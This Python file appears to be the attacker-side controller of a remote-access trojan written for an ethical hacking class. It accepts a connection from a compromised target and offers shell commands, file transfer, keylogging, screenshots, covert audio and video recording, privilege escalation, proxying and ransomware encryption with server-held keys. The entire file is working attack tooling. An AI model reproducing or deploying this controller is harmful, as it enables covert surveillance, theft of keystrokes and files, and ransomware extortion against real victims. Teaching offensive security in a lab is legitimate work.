################################################
# Author: Watthanasak Jeamwatthanachai, PhD    #
# Class: SIIT Ethical Hacking, 2023-2024       #
################################################

# Import necessary libraries
import socket  # This library is used for creating socket connections.
import json  # JSON is used for encoding and decoding data in a structured format.
import os  # This library allows interaction with the operating system.
import base64  # For decoding image/audio data
import datetime  # For timestamps

from features.ransomware_server import create_ransomware_server

# Global ransomware server instance
ransomware_server = None


# Function to send data reliably as JSON-encoded strings
def reliable_send(data):
    # Convert the input data into a JSON-encoded string.
    jsondata = json.dumps(data)
    # Send the JSON-encoded data over the network connection after encoding it as bytes.
    target.send(jsondata.encode())


# Function to receive data reliably as JSON-decoded strings
def reliable_recv():
    data = ''
    while True:
        try:
            # Receive data from the target (up to 1024 bytes), decode it from bytes to a string,
            # and remove any trailing whitespace characters.
            data = data + target.recv(1024).decode().rstrip()
            # Parse the received data as a JSON-decoded object.
            return json.loads(data)
        except ValueError:
            continue


# Function to upload a file to the target machine
def upload_file(file_name):
    # Open the specified file in binary read ('rb') mode.
    f = open(file_name, 'rb')
    # Read the contents of the file and send them over the network connection to the target.
    target.send(f.read())
    # Close the file after uploading is complete.
    f.close()


# Function to download a file from the target machine
def download_file(file_name):
    # Open the specified file in binary write ('wb') mode.
    f = open(file_name, 'wb')
    # Set a timeout for receiving data from the target (1 second).
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        # Write the received data (chunk) to the local file.
        f.write(chunk)
        try:
            # Attempt to receive another chunk of data from the target.
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    # Reset the timeout to its default value (None).
    target.settimeout(None)
    # Close the local file after downloading is complete.
    f.close()


# Function for the main communication loop with the target
def target_communication():
    global ransomware_server
    
    print("BASIC COMMANDS:")
    print("   whoami, dir, ipconfig, pwd, ps, net user")
    print("   cd <path>              - Change directory")
    print("")
    print("FILE OPERATIONS:")
    print("   upload <filename>      - Upload file to target")
    print("   download <filename>    - Download file from target")
    print("")
    print("KEYLOGGER COMMANDS:")
    print("   start_keylog           - Start keylogger")
    print("   stop_keylog            - Stop keylogger")
    print("   get_keylog             - Retrieve logged keys")
    print("")
    print("RECORDING COMMANDS:")
    print("   screenshot             - Take screenshot")
    print("   start_audio            - Start audio recording only")
    print("   stop_audio             - Stop audio recording")
    print("   start_video            - Start video recording only")
    print("   stop_video             - Stop video recording")
    print("   start_recording        - Start both audio & video")
    print("   stop_recording         - Stop both audio & video")
    print("   list_recordings        - List recorded files")
    print("")
    print("PRIVILEGE ESCALATION:")
    print("   check_privs            - Check current privileges")
    print("   escalate               - Attempt privilege escalation")
    print("   privesc_report         - Generate privilege report")
    print("")
    print("RANSOMWARE COMMANDS:")
    print("   ransomware_init        - Initialize ransomware client")
    print("   ransomware_scan        - Scan for target files")
    print("   ransomware_encrypt <n> - Encrypt n files (server-side encryption)")
    print("   ransomware_status      - Get ransomware status")
    print("   ransomware_decrypt_attempt - Test client decryption block")
    print("   ransomware_server_stats - Show server encryption stats")
    print("")
    print("PROXY COMMANDS:")
    print("   start_proxy            - Start proxy channel (auto new random port)")
    print("   stop_proxy             - Stop proxy channel")
    print("   proxy_status           - Get proxy status")
    print("   test_proxy             - Test if proxy is responding")
    print("")
    print(f"Connected to target: {ip[0]}:{ip[1]}")
    
    while True:
        # Prompt the user for a command to send to the target.
        command = input('* Shell~%s: ' % str(ip))
        
        # Handle empty commands
        if not command:
            continue
            
        # Handle help command locally
        if command == 'help':
            target_communication()
            break
            
        # Send the user's command to the target using the reliable_send function.
        reliable_send(command)
        
        if command.startswith('cd '):
            # Handle directory change
            result = reliable_recv()
            print(result)
        elif command.startswith('download '):
            # If the user enters 'download', initiate the download of a file from the target.
            filename = command[9:].strip()
            download_file(filename)
        elif command.startswith('upload '):
            # If the user enters 'upload', initiate the upload of a file to the target.
            filename = command[7:].strip()
            if filename and os.path.exists(filename):
                upload_file(filename)
                result = reliable_recv()
                print(result)
            elif not filename:
                print("Please specify a filename to upload")
            else:
                print(f"File not found: {filename}")
        elif command in ['start_keylog', 'stop_keylog', 'get_keylog']:
            # Handle keylogger commands
            result = reliable_recv()
            if command == 'start_keylog':
                print(f"Keylogger: {result}")
            elif command == 'stop_keylog':
                print(f"Keylogger: {result}")
            elif command == 'get_keylog':
                print(f"Keylog Data:\n{'-'*40}")
                print(result)
                print("-"*40)
        elif command in ['screenshot', 'start_audio', 'stop_audio', 'staaudio', 'stop_audio', 'start_video', 'stop_video', 'start_rt_video', 'stop_video', 'start_recording', 'stop_recording', 'recording_status', 'list_recordings']:
            # Handle recording commands
            result = reliable_recv()
            if command == 'screenshot':
                if isinstance(result, dict) and result.get('action') == 'screenshot':
                    # Save screenshot to server
                    import base64
                    import os
                    
                    # Create recordings directory if it doesn't exist
                    recordings_dir = "recordings"
                    if not os.path.exists(recordings_dir):
                        os.makedirs(recordings_dir)
                    
                    # Decode and save image
                    image_data = base64.b64decode(result['data'])
                    filepath = os.path.join(recordings_dir, result['filename'])
                    
                    with open(filepath, 'wb') as f:
                        f.write(image_data)
                    
                    print(f"Screenshot saved to: {filepath} ({result['size']} bytes)")
                else:
                    print(f"Screenshot: {result}")
            elif command in ['start_audio', 'start_video', 'start_recording']:
                print(f"Recording: {result}")
            elif command == 'stop_audio':
                if isinstance(result, dict) and result.get('action') == 'audio':
                    # Save audio file to server
                    import base64
                    import os
                    
                    recordings_dir = "recordings"
                    if not os.path.exists(recordings_dir):
                        os.makedirs(recordings_dir)
                    
                    audio_data = base64.b64decode(result['data'])
                    audio_path = os.path.join(recordings_dir, result['filename'])
                    
                    with open(audio_path, 'wb') as f:
                        f.write(audio_data)
                    
                    print(f"Audio saved to: {audio_path} ({result['size']} bytes)")
                else:
                    print(f"Audio: {result}")
            elif command == 'stop_video':
                if isinstance(result, dict) and result.get('action') == 'video':
                    # Save video file to server
                    import base64
                    import os
                    
                    recordings_dir = "recordings"
                    if not os.path.exists(recordings_dir):
                        os.makedirs(recordings_dir)
                    
                    video_data = base64.b64decode(result['data'])
                    video_path = os.path.join(recordings_dir, result['filename'])
                    
                    with open(video_path, 'wb') as f:
                        f.write(video_data)
                    
                    print(f"Video saved to: {video_path} ({result['size']} bytes)")
                else:
                    print(f"Video: {result}")
            elif command == 'stop_recording':
                if isinstance(result, dict) and result.get('action') == 'recording':
                    # Save audio and video files to server
                    import base64
                    import os
                    
                    recordings_dir = "recordings"
                    if not os.path.exists(recordings_dir):
                        os.makedirs(recordings_dir)
                    
                    saved_files = []
                    
                    # Save audio if available
                    if result.get('audio_data'):
                        audio_data = base64.b64decode(result['audio_data'])
                        audio_path = os.path.join(recordings_dir, result['audio_filename'])
                        with open(audio_path, 'wb') as f:
                            f.write(audio_data)
                        saved_files.append(f"Audio: {audio_path} ({result['audio_size']} bytes)")
                    
                    # Save video if available
                    if result.get('video_data'):
                        video_data = base64.b64decode(result['video_data'])
                        video_path = os.path.join(recordings_dir, result['video_filename'])
                        with open(video_path, 'wb') as f:
                            f.write(video_data)
                        saved_files.append(f"Video: {video_path} ({result['video_size']} bytes)")
                    
                    if saved_files:
                        print(f"Recording files saved:\n" + "\n".join(saved_files))
                    else:
                        print("No recording data received")
                else:
                    print(f"Recording: {result}")
            elif command == 'list_recordings':
                # List recordings from server directory
                import os
                recordings_dir = "recordings"
                if os.path.exists(recordings_dir):
                    files = os.listdir(recordings_dir)
                    if files:
                        print(f"Recordings on server ({len(files)} files):")
                        for filename in sorted(files):
                            filepath = os.path.join(recordings_dir, filename)
                            size = os.path.getsize(filepath)
                            print(f"  - {filename} ({size} bytes)")
                    else:
                        print("No recordings found on server")
                else:
                    print("No recordings directory found on server")
                
                # Also show target response
                print(f"\nTarget response: {result}")
        elif command in ['start_proxy', 'stop_proxy', 'proxy_status', 'test_proxy']:
            # Handle proxy commands
            result = reliable_recv()
            if command == 'start_proxy':
                print(f"proxy: {result}")
            elif command == 'stop_proxy':
                print(f"proxy: {result}")
            elif command == 'proxy_status':
                print(f"proxy Status:\n{'-'*40}")
                print(result)
                print("-"*40)
            elif command == 'test_proxy':
                print(f"Proxy Test: {result}")
        elif command in ['check_privs', 'escalate', 'privesc_report']:
            # Handle privilege escalation commands
            result = reliable_recv()
            if command == 'check_privs':
                print(f"Privileges: {result}")
            elif command == 'escalate':
                print(f"Escalation Result:\n{'-'*40}")
                print(result)
                print("-"*40)
            elif command == 'privesc_report':
                print(f"Privilege Report:\n{'-'*40}")
                print(result)
                print("-"*40)
        elif command in ['ransomware_init', 'ransomware_scan', 'ransomware_status', 'ransomware_decrypt_attempt']:
            # Handle basic ransomware commands
            result = reliable_recv()
            if command == 'ransomware_init':
                print(f"Ransomware Init:\n{'-'*40}")
                print(result)
                print("-"*40)
            elif command == 'ransomware_scan':
                print(f"File Scan: {result}")
            elif command == 'ransomware_status':
                print(f"Ransomware Status:\n{'-'*40}")
                print(result)
                print("-"*40)
            elif command == 'ransomware_decrypt_attempt':
                print(f"Decryption Attempt (Should Be Blocked):\n{'-'*40}")
                print(result)
                print("-"*40)
        elif command.startswith('ransomware_encrypt '):
            # Handle file encryption request from client
            result = reliable_recv()
            try:
                # Parse the prepared files data from client
                encryption_request = json.loads(result)
                
                if encryption_request.get('action') == 'encrypt_batch':
                    if ransomware_server is None:
                        ransomware_server = create_ransomware_server()
                    
                    # Process each file for encryption
                    prepared_files = encryption_request.get('prepared_files', [])
                    session_id = encryption_request.get('session_id', 'unknown')
                    
                    print(f"Processing {len(prepared_files)} files for encryption...")
                    
                    # Prepare files for server encryption
                    files_data = []
                    for file_item in prepared_files:
                        file_data = bytes.fromhex(file_item['file_data_hex'])
                        files_data.append({
                            'file_data': file_data,
                            'file_info': file_item['file_info']
                        })
                    
                    # Encrypt files using server
                    encryption_results = ransomware_server.encrypt_files_batch(files_data, session_id)
                    
                    print(f"Server Encryption Results:\n{'-'*40}")
                    for i, result in enumerate(encryption_results):
                        if result['success']:
                            print(f"File {i+1}: {result['original_path']} -> {result['file_id']}")
                        else:
                            print(f"File {i+1}: {result['original_path']} -> {result['error']}")
                    print("-"*40)
                    
                    # Send results back to client (in real implementation)
                    # For now, just show server-side success
                    successful = sum(1 for r in encryption_results if r['success'])
                    print(f"Encrypted {successful}/{len(encryption_results)} files successfully")
                
            except Exception as e:
                print(f"Encryption processing error: {e}")
        elif command == 'ransomware_server_stats':
            # Handle server-side ransomware stats locally
            if ransomware_server is None:
                ransomware_server = create_ransomware_server()
            
            stats = ransomware_server.get_server_statistics()
            print(f"Server Ransomware Stats:\n{'-'*40}")
            print(json.dumps(stats, indent=2))
            print("-"*40)
        else:
            # For other commands, receive and print the result from the target.
            result = reliable_recv()
            print(f"Output:\n{result}")



# Create a socket for the server
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Allow socket reuse to prevent "Address already in use" error
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# Bind the socket to listen on all interfaces and port 5555
# CHANGE IP TO YOUR KALI LINUX IP OR USE 0.0.0.0 to listen on all interfaces
sock.bind(('0.0.0.0', 5555))  # Listen on all interfaces

# Start listening for incoming connections (maximum 5 concurrent connections).
print('[+] Listening For The Incoming Connections on port 5555')
sock.listen(5)

# Accept incoming connection from the target and obtain the target's IP address.
target, ip = sock.accept()
print('[+] Target Connected From: ' + str(ip))

# Initialize ransomware server
ransomware_server = create_ransomware_server()
print('[+] Ransomware Server Initialized - All encryption keys secured server-side')

# Start the main communication loop with the target by calling target_communication.
target_communication()
